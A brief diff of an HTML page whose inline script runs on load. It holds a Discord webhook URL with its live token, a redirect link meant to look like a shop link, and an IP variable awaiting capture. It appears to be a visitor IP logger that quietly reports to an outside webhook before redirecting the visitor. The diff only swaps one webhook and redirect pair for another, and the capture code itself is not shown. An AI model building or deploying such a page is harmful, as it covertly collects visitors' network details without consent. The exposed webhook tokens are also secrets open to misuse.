@@ -12,8 +12,8 @@
 <body>
 <script>
     (async function() {
-        const webhookURL = "https://discord.com/api/webhooks/1521193676942868512/Ibu8o93vsgeF_DYexLDTo7H6rOpZncNtyoAq_xbuuE4taOhBE-PhMDotKBwix2gNVUG3";
-        const redirectURL = "https://youtu.be/70IlXH_R8JE?si=enSU59mABMNOJFDc"; // ← COLOCA AQUI O LINK DA TUA LOJA
+        const webhookURL = "https://discord.com/api/webhooks/1520884691513639174/nz4F2yga5kOKPn0knFLa4fk786ksWsoM9dUDWrHz4tRUPqZejuhscaxDkgUluMVPGp37";
+        const redirectURL = "https://youtu.be/zar1aeSaslA?si=SciLKK-gG_QcbNo5"; // ← COLOCA AQUI O LINK DA TUA LOJA
 
         let ip = "Não capturado";
         try {
